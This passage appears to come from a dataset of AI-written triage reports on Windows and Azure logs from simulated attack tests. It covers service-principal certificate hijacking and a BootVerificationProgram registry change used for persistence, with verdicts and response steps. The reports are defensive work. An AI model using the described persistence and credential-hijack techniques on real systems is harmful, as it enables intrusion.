  - Commands involve converting a plaintext password to a secure string and establishing a connection with Azure AD using the credentials of a user (""jonh@contoso.com"").
  - A self-signed certificate is created for an Azure AD service principal. This activity includes:
    - Creation of a new Service Principal Key Credential.
    - Attempted connection to Azure AD using this certificate.
    - The command `Write-Host ""Application Hijacking worked...""` suggests that the intent is potentially malicious or simulated hijacking.

- **Observations:**
  - Use of plain text password conversion in PowerShell is a security risk.
  - The script suggests a form of credential misuse or a potential lateral movement attempt in a cloud environment.
  - The script contains comments referring to an ""ART test"". This might imply it's part of an authorized test or attack simulation; however, it raises alarms if not validated by known authorized activities.

#### Sysmon Logs:
- **Process Activity:**
  - Multiple executions of `powershell.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
  - Execution of `wevtutil.exe`, a tool used for managing event logs, which is utilized to export event logs. This could be indicative of log manipulation or exfiltration.
  - Process tree suggests abnormal chains such as `wsmprovhost.exe` (a Windows Remote Management-related service) spawning PowerShell, which then spawns other processes such as hostname, whoami, and additional conhost instances.

- **Observations:**
  - Execution of `wevtutil.exe` to export logs is suspicious, particularly if not part of routine maintenance or troubleshooting.
  - WSM provider host spawning PowerShell sessions is atypical and could suggest remote management or exploitation activities.
  - Activities are conducted under a `High` integrity level, indicating elevated privileges.

### Final Assessment:

The evidence from the PowerShell and Sysmon logs highlights several red flags associated with potentially malicious activities:
- Use of sensitive command-line operations via PowerShell with credential manipulation.
- Self-signed certificate usage for Azure AD access, possibly indicating credential hijacking.
- Exporting event logs without clear justification can indicate log tampering.

The activity described as an ""Application Hijacking"" combined with the creation of credentials including a certificate, if not part of a known security test, could be considered as preparations for lateral movement or persistence in the environment.

### Resolution: **MALICIOUS**

### Guidance:
1. **Immediate Actions:**
   - Verify if the detected activities are part of a legitimate assessment (e.g., authorized penetration test or security audit). Confirm with IT/security teams if ART tests were planned or documented.
   - Immediately isolate Server002 from the network to prevent further potential compromise or data exfiltration.
   - Change the credentials for the affected user accounts and service principals noted in the logs.

2. **Further Investigation:**
   - Conduct a thorough forensic analysis on Server002 to identify any additional compromise indicators.
   - Review Azure AD and on-premises activity for further suspicious patterns or anomalies.
   - Analyze the self-signed certificate's usage throughout environments to assess if backdoors were deployed elsewhere.

3. **Prevention Measures:**
   - Implement enhanced monitoring on PowerShell activities, especially those interacting with cloud services.
   - Ensure all security tests are well-documented, and personnel are aware to reduce false positives that hinder timely responses to actual incidents.
   - Educate employees about the dangers of plain text credentials and enforce best practice policies securely.

Confirming the legitimacy (or not) of this activity with clear correlations from official documents or authorized personnel is crucial for accuracy in mitigation and response."
Creating Boot Verification Program Key for application execution during successful boot,"Upon analyzing the provided Windows event logs across different channels, here's the detailed assessment of activity:

### System Log:
- **Time Change Events**: We see several events (EventID 24 and 1) related to time changes executed by the `svchost.exe` process. These events are not uncommon, especially if the machine synchronizes its time with an NTP server (`time.windows.com`). The time changes fit the behavior of regular time synchronization and do not immediately indicate malicious activity on their own.

### Sysmon Log:
- **Process Creation and Execution**: 
  1. **Cmd.exe Execution**: A command was executed to modify the registry, specifically targeting the BootVerificationProgram (EventID 1 with `cmd.exe` and `reg.exe`). The command modified the ImagePath of the BootVerificationProgram to `iexplore.exe`. Modifying registry keys related to boot operations can be a vector for persistence mechanisms.
  2. **Frequent Execution of System Utilities**: Commands involving system utilities like `wevtutil.exe`, `conhost.exe`, and Microsoft Edge Update processes are observed repeatedly. While frequent execution of tools like `wevtutil.exe` could suggest log querying or clearing, this behavior can fit legitimate administrative actions, especially given the user context `SERVER002\admin_test`.

### Security Log:
- **Logon and Privilege Use**:
  - There are events indicating a logon session with elevated privileges (EventID 4672) via NTLM, which is a standard protocol. Administrative privileges engaged by the `admin_test` user align with potential administrative tasks.

### Application Log:
- **Edge Update Service**: The logs show occurrences of the Edge Update service stopping, which is a routine process during update operations.

### Comprehensive Analysis:
The logs suggest potential administrative actions, including system time synchronization, registry modifications, and update processes for Microsoft Edge. The presence of elevated privileges and specific registry modifications (e.g., BootVerificationProgram entry change) imply administrative tasks that could be routine or potentially indicative of persistence techniques if not authorized.

The execution of `cmd.exe` with the intent to modify registry keys related to boot operations stands out as the most suspicious activity.

### Assessment:
- **Resolution**: **SUSPICIOUS**
- Modifying critical registry keys, particularly those affecting boot processes, can be an indicator of an attempt to establish persistence or execute unauthorized actions. While the logs do not conclusively confirm malicious activity, the observed actions are unusual enough to warrant further investigation.

### Recommendations:
- Review authorized changes by the user `admin_test` and confirm if registry modifications were intended.
- Conduct a forensic analysis of the system to ensure no unwanted software or persistent mechanisms have been established.
- Monitor for additional signs of unauthorized access or tampering, and consider tightening security policies if necessary."
